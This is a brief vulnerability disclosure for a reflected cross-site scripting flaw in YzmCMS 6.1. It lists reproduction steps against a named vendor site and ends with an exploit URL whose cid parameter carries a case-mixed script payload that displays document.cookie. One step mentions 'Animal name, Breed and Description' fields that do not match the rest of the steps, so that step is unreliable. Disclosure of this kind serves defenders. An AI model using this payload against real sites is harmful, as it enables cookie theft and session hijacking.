                    **yzmcms Reflective Cross-Site-Scripting (XSS) exists**

version：6.1

date：2021-07-12

Author:刘峻岑

Vendor Homepage:http://www.ling-bu.com

Platf orm:php

Type:webapps

```
 Description:
 1.Goto://www.ling-bu.com/member/index/login.html
   Register and log in
 
 2.Goto:http://www.ling-bu.com/member/index/user_pic.html
   Upload avatar,Right click to find his path
 
 3.Goto:http://www.ling-bu.com/uploads/202107/09/210709060654620.gif
   View the path of the picture:/uploads/202107/09/210709060654620.gif
   Encode it in base64:L3VwbG9hZHMvMjAyMTA3LzA5LzIxMDcwOTA2MDY1NDYyMC5naWY=
   
 4.Fill out Animal name, Breed and Description with given payload:</ScRiPt><sCrIpT>alert(document.cookie)</sCrIpT>
 
 5.GOto:http://www.ling-bu.com/attachment/api/img_cropper/spec/2.html?f=L3VwbG9hZHMvMjAyMTA3LzA5LzIxMDcwOTA2MDY1NDYyMC5naWY=&cid=</ScRiPt><sCrIpT>alert(document.cookie)</sCrIpT>
 
 6.Reflective XSS load is triggered
 
```

